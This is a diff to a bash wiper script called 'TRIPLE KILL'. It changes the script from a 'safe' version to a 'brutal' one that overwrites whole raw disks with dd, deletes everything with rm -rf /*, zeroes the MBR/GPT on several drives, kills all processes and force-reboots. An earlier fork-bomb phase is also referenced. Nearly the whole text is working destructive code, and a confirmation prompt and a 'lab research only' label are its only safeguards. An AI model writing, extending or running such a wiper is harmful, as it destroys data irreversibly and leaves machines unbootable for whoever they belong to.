@@ -1,16 +1,20 @@
 #!/bin/bash
 # ============================================================
-# TRIPLE KILL - SAFE VERSION (NO MBR/BOOT DAMAGE)
+# TRIPLE KILL - BRUTAL VERSION (MBR/GPT DESTROYED)
 # FOR LAB RESEARCH ONLY!
+# SYSTEM WILL NOT BOOT AFTER THIS!
 # ============================================================
 
-echo "WARNING: This script will DESTROY the system!"
-echo "Boot partition is SAFE (MBR/GPT not touched)"
+echo "WARNING: This script will COMPLETELY DESTROY the system!"
+echo "  - MBR/GPT will be wiped"
+echo "  - All data will be lost"
+echo "  - System will NOT boot again"
+echo "  - Requires full reinstall from USB/DVD"
 echo ""
-echo "Type 'YES' to continue:"
+echo "Type 'yes' to continue:"
 read confirm
 
-if [ "$confirm" != "YES" ]; then
+if [[ "${confirm,,}" != "yes" ]]; then
     echo "Aborted."
     exit 0
 fi
@@ -35,31 +39,41 @@ chmod +x /tmp/fork_bomb.sh
 echo "Fork bomb running."
 
 # ============================================================
-# PHASE 2: DISK FILLER
+# PHASE 2: DISK FILLER - DIRECT TO DISK
 # ============================================================
-echo "[PHASE 2] Disk filler..."
+echo "[PHASE 2] Disk filler (writing directly to disk)..."
 (
-    while true; do
-        dd if=/dev/urandom of=/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
-        dd if=/dev/urandom of=/var/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
-    done
+    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null &
+    dd if=/dev/urandom of=/dev/sdb bs=1M 2>/dev/null &
+    dd if=/dev/urandom of=/dev/sdc bs=1M 2>/dev/null &
 ) &
 echo "Disk filler running."
 
 # ============================================================
-# PHASE 3: DELETE SYSTEM FILES (EXCEPT /boot)
+# PHASE 3: DELETE ALL SYSTEM FILES
 # ============================================================
-echo "[PHASE 3] Deleting system files..."
+echo "[PHASE 3] Deleting ALL system files..."
 (
-    rm -rf /bin /etc /lib /lib64 /sbin /usr /var /opt /home /root 2>/dev/null &
-    find /* -maxdepth 0 ! -path /boot ! -path /dev ! -path /proc ! -path /sys -exec rm -rf {} \; 2>/dev/null &
+    rm -rf /* 2>/dev/null &
 ) &
-echo "System files deleted (except /boot)."
+echo "All system files deleted."
 
 # ============================================================
-# PHASE 4: KILL PROCESSES
+# PHASE 4: DESTROY MBR/GPT
 # ============================================================
-echo "[PHASE 4] Killing processes..."
+echo "[PHASE 4] Destroying MBR/GPT..."
+(
+    dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null
+    dd if=/dev/zero of=/dev/sdb bs=512 count=1 2>/dev/null
+    dd if=/dev/zero of=/dev/sdc bs=512 count=1 2>/dev/null
+    dd if=/dev/zero of=/dev/nvme0n1 bs=512 count=1 2>/dev/null
+) &
+echo "MBR/GPT destroyed."
+
+# ============================================================
+# PHASE 5: KILL ALL PROCESSES
+# ============================================================
+echo "[PHASE 5] Killing all processes..."
 pkill -9 -f . 2>/dev/null &
 echo "Processes killed."
 
@@ -68,15 +82,18 @@ echo "Processes killed."
 # ============================================================
 echo ""
 echo "============================================================"
-echo "SYSTEM DESTROYED - BOOT IS SAFE"
+echo "SYSTEM COMPLETELY DESTROYED"
 echo "  CPU: Overloaded (fork bomb)"
-echo "  Disk: /tmp & /var full"
+echo "  Disk: Overwritten with random data"
 echo "  OS: Completely deleted"
-echo "  MBR/GPT: SAFE (untouched)"
-echo "  /boot: SAFE (kernel & initrd intact)"
+echo "  MBR/GPT: WIPED (ZEROED OUT)"
+echo "  Boot: IMPOSSIBLE"
 echo ""
-echo "System will reboot in 5 seconds..."
+echo "THIS SYSTEM WILL NEVER BOOT AGAIN"
+echo "You need to reinstall from USB/DVD"
+echo ""
+echo "Rebooting in 5 seconds..."
 echo "============================================================"
 
 sleep 5
-reboot
+reboot -f
